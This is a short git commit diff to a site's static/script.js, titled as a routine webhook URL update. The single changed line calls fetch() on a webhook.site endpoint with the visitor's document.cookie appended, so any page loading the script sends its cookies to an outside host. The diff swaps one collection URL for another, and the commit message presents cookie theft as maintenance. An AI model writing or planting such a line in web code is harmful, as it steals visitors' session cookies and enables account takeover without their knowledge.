488b167a80dcad0d8d51fb1b08d1d15407d54e69
WEI-HUNG HUANG <sol049119@gmail.com>
2026-05-16 11:57:41 +0800

    Update webhook URL in script.js

--- static/script.js
+++ static/script.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/b9df964a-a3ed-4bd2-97cd-24ec25140dfc?ping=1'+encodeURIComponent(document.cookie));
+fetch('https://webhook.site/9c53a6c2-c53b-45a4-aadf-d4302310ea4b?ping=1'+encodeURIComponent(document.cookie));
